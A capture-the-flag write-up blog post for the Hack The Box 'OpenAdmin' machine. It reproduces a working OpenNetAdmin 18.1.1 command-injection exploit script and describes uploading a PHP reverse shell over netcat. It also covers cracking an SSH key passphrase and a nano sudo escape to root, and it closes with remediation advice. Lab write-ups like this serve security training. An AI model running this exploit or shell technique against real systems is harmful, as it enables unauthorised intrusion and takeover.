---
layout: post
title:  "HTB: OpenAdmin Walkthrough"
categories: writeups HTB
permalink: /:categories/:title
---

![OpenAdmin Logo](../../assets/img/writeups/htb/openadmin/info_card.png)

Date: ?/?/2020   
Author: n0tAc0p  

Table of Contents
1. TOC 
{:toc} 

### TL;DR

`Vulnerable web application --> plaintext credentials --> internal site which dumps SSH key pair --> sudo without password on Nano (GTFO)`

### Recon and Enumeration

Per usual, we started out with a `masscan`. It found open ports on 22 and 80. We followed that up with a detailed `nmap` scan.

![Detailed Port Scan](../../assets/img/writeups/htb/openadmin/detailed_port_scan.png)

So we have:  

22 (SSH)  
80 (Web Server running Apache)  

Navigating to 10.10.10.171 we discover the lovely default Apache page.

![Default Apache Page](../../assets/img/writeups/htb/openadmin/apache_homepage.png)

#### Directory Enumeration

With not much to go on from the default Apache page, I spun up gobuster using the `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` wordlist.

It found:

/music  
/artwork  
/marga  
/sierra  

All the pages had mostly static content, and were based on templates from [cololib](https://colorlib.com/){:target="_blank"}([1]). Below is a screenshot of 10.10.10.171/music.

![Music Subdirectory](../../assets/img/writeups/htb/openadmin/music_dir.png)

After searching through source code, there was not much to be seen. No credentials, or places for user input. If you click on the login button on the *SolMusic* site (/music), it brings you back to the default Apache page, except the URL is now 10.10.10.171/ona/. 

#### ONA (Open Network Admin)

It was not until after googling 20+ mins for "Open Admin" Vulnerabilities, and seeing someone on a forum thread mention /ona again, that I realized /ona was important. 

Before we get there though, we should note that Open Admin is an [IBM tool](https://www.ibm.com/support/knowledgecenter/en/SSGU8G_12.1.0/com.ibm.oat.doc/ids_oat.htm){:target="_blank"}([2]), that also happens to have a somewhat new PHP RCE vulnerability. This is **NOT** the Open Admin service we are looking for. There is a metasploit module that corresponds to the vulnerability, but it does not work in our case.

So back to /ona. After extensive googling I was able to find a github repository for one [Open Net Admin](https://github.com/opennetadmin/ona){:target="_blank"}([3]). I am sure I am not the only one who went on a wild goose chase googling for Open Admin, only to discover what I really needed was *Open Net Admin*. Open Net Admin is an IP Address Management system, IPAM for short.

I found a recent exploit for the service on a few sites, but found the one by mattpascoe at [Packet Storm](https://packetstormsecurity.com/files/155406/OpenNetAdmin-18.1.1-Remote-Code-Execution.html){:target="_blank"} to be the most informative. See below:

~~~bash
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
~~~

**I used [explainshell](https://explainshell.com/){:target="_blank"} and looked through the vulnerable source code, but was unable to determine exactly how the exploit works. I looked for articles or videos, and still could not find anything. At this point, I understand it gives us Remote Code Execution. I wish I could explain how it works, but I will have to read other writeups first. ([9])**

We copied this script to our local machine and were able to execute almost any command as the `www-data` user. **Important: the single parameter we need to pass the payload is the address of the ONA login page. In our case it is 10.10.10.171/ona/login.php** I determined that after looking through the URL used for exploitation on [Exploit DB](https://www.exploit-db.com/exploits/47772){:target="_blank"} ([8]).

{:refdef: style="text-align: center;"}
![Known Exploit](../../assets/img/writeups/htb/openadmin/known_exploit.png)
{: refdef}

### Initial Foothold

So we have Remote Code Execution as `www-data`. During my initial efforts, I uploaded a php web shell (found [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell){:target="_blank"}  at Pentest Monkey) to the /opt/ona/www directory ([4]). FOr some reason, I could not get any other reverse shell to work. I used netcat to transfer the file from my machine to the box. Since /ona/www was the public facing website, when I navigated to 10.10.10.171/ona/[name of uploaded file].php I could get a reverse shell back on my local machine.

#### Transferring Files with Netcat

In case you are wondering how to transfer files with netcat (skip this section if you are not wondering):

~~~bash
# on your local machine
# -w 3 means timeout after 3 seconds of idle connection
nc -w 3 <remote_ip> <remote_port> < <input_file_path>
# on remote machine 
nc -lvnp <port_number> > <output_file_path>

# Real example
nc -w 3 10.10.10.171 40005 < php-reverse-shell.php
nc -lvnp 40005 > /opt/ona/www/lamp.php

# Then we can get the shell back by navigating to 10.10.10.171/ona/lamp.php
~~~

**Make sure to edit the reverse shell to have your IP and port before sending it to the remote target. Otherwise it will not work.**

Once we got the reverse shell back, I ran:

~~~bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=screen
export SHELL=/bin/bash
~~~

Part of making a shell full TTY (see [RopNop's Guide](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/){:target="_blank"}  for more details), this made the shell easier to use in my case ([5]).

#### LinPEAS/LinEnum

We ran both these scripts, the only takeaway being that `mySQL` was running on the box. We tried default credentials, but they did not work.

#### Plaintext Credentials

After searching through various config files, we found plaintext database credentials in /opt/ona/www/local/config/database_settings.inc.php

![Initial Database Creds](../../assets/img/writeups/htb/openadmin/initial_creds.png)

We can use the username and password above to log into mysql using:

`mysql -u ona_sys -p n1nj4W4rri0R!`

### Getting User 

#### mySQL

Once logged in we used:

~~~bash
use ona_default;
show tables;
SELECT * FROM users;
~~~

Which gave us a user table for the Open Net Admin page:

![User Table](../../assets/img/writeups/htb/openadmin/users_table.png)

I used [CrackStation](https://crackstation.net){:target="_blank"} to quickly check if the hashes could be cracked ([6]).

![Crack Station](../../assets/img/writeups/htb/openadmin/crackstation.png)

It was at this moment I realized that these were passwords for the Open Net Admin dashboard, which would not get me any closer to user `joanne`. I committed a grave error earlier on. I never tried the password I found as a password for either `jimmy` or `joanna` (both were users on the box). Turns out, the plaintext DB password allowed us to SSH as `jimmy`. 

**This blunder only wasted about an hour, but helped me remember to try different things when we find credentials**

{:refdef: style="text-align: center;"}
![Jimmy User](../../assets/img/writeups/htb/openadmin/jimmy_user.png)
{: refdef}

#### linPEAS (Again)

Running linPEAS again, we find that jimmy owns the 'internal' folder at `/var/html/www/internal/`.

#### Internal Website

There are 3 files:

1. index.php (Which looks to be a login page, which redirects us to main.php)
2. main.php (Which looks to print out an SSH private key for Joanna if we authenticated)
3. logout.php

main.php
{:refdef: style="text-align: center;"}
![Main.php](../../assets/img/writeups/htb/openadmin/internal_main_php.png)
{: refdef}

But where are these pages running? Not on 10.10.10.171:80. We checked out `/etc/apache2/sites-available/internal.conf`

Apache Config
{:refdef: style="text-align: center;"}
![Internal Apache Configuration](../../assets/img/writeups/htb/openadmin/internal_vhost.png)
{: refdef}

We can see the /var/html/www/internal site is being hosted on... localhost? On port 52846. While we cannot access this page from a browser, we can use curl. The important thing to note here, is that by *default* `curl` does NOT follow redirects. So if we `curl` localhost:52846/main.php it will:

1. Check if we are authenticated
2. If not, redirect our "browser" (in this case, `curl`) to login.php
3. `curl` does not follow redirects by default, so it stays on the page regardless
4. The rest of the script executes and prints the SSH key for `joanna`

With Redirects (use the -L flag)(This response is the top of the internal log in page)
{:refdef: style="text-align: center;"}
![Curl with Redirects](../../assets/img/writeups/htb/openadmin/redirects_on.png)
{: refdef}

Without Redirects (Just what we wanted)
{:refdef: style="text-align: center;"}
![Curl without Redirects](../../assets/img/writeups/htb/openadmin/no_redirects.png)
{: refdef}

We can copy and paste this key, call `chmod 600 id_rsa` on it, then attempt to SSH with joanna. Before it worked, we had to use `SSH2John and john the ripper` to crack the SSH passphrase. All about the ninjas.

You can find a copy of SSH2John [here](https://github.com/koboi137/john)

The syntax to convert an SSH private key to something John can crack is:

~~~bash
$ python ssh2john.py <path-to-private-key> > joannaSSHPassPhraseCrack
~~~

Then onto John
![Passphrase crack](../../assets/img/writeups/htb/openadmin/joanna_passphrase_crack.png)

And we are in with Joanna.

{:refdef: style="text-align: center;"}
![Joanna User](../../assets/img/writeups/htb/openadmin/joanna_user.png)
{: refdef}

### Privilege Escalation

Running `sudo -l` we see that joanna can run `/bin/nano /opt/priv`. Now we just need to break out of Nano and get a shell.

#### GTFO: Nano Edition

Following the instructions found on [GTFOBins](https://gtfobins.github.io/gtfobins/nano/){:target="_blank"}([7])

~~~bash
/bin/nano /opt/priv
# ^R == Cntrl-R at the same time
^R^X
reset; sh 1>&0 2>&0
~~~

And we are root!

{:refdef: style="text-align: center;"}
![Root User](../../assets/img/writeups/htb/openadmin/root_user.png)
{:refdef}

### Conclusion

#### Fixes

As always, I try to determine fixes that could have stopped us from getting root. They are not guranteed to be correct, nor the only approach out there.

1. OpenNetAdmin allows for remote code execution through its login page  
**Fix: As I said above, I am unsure 100% how the exploit works, so I have no suggested fix at this time**
2. Plaintext database credentials, reused on user jimmy  
**Fix: Do not reuse passwords, store credentials safely and NOT in plaintext**
3. Internal site dumped SSH key for Joanna  
**Fix: Do not give Jimmy permission to a local webpage which runs under Joanna's permissions**
4. Joanna could run sudo without a password on Nano  
**Fix: Audit which users can run sudo without passwords, and check if they are necessary. In this case, Joanna should NOT be allowed to call sudo without a password**

#### Final Thoughts

Overall, another great box. It was humbling for me because I thought I could tackle it in a night given it was an "easy" box. Took me longer than some
medium boxes because I was extremely lax in my enumeration. Woke me up a little, and reminded me of some basic techniques. Thanks to `dmw0ng` for creating it, and thank you for reading. Onto the next one...

As always, if you have any questions or feedback, please contact me on HTB! I am always looking to improve my writing to make it as clear and concise as possible (while remaining somewhat beginner friendly). Happy Hacking!

### References

1. Colorlib homepage: https://colorlib.com/
2. IBM Open Admin: https://www.ibm.com/support/knowledgecenter/en/SSGU8G_12.1.0/com.ibm.oat.doc/ids_oat.htm
3. Open Net Admin Github Page: https://github.com/opennetadmin/ona
4. Pentest Monkey PHP Web Shell: http://pentestmonkey.net/tools/web-shells/php-reverse-shell
5. RopNop's TTY Guide: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
6. Crack Station: https://crackstation.net/
7. Nano GTFOBins: https://gtfobins.github.io/gtfobins/nano/
8. Exploit DB OpenNetAdmin 18.1.1: https://www.exploit-db.com/exploits/47772
9. Explainshell: https://explainshell.com/